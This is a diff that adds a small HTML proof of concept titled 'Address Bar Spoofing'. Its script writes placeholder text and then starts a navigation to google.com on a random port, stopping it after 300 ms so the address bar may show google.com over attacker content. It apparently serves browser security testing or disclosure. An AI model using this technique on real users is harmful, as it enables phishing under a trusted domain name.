@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Address Bar Spoofing</title>
+    </head>
+    <body>
+        <script>
+            function spoof() {
+                document.write("This is not google.com");
+                setTimeout(() => {
+                    window.stop();
+                    document.location = "https://google.com:" + Math.floor(Math.random() * 100) + "/login";
+                }, 300);
+            }
+        </script>
+        <input type="button" value="Run" onclick="spoof()"/>
+    </body>
+</html>
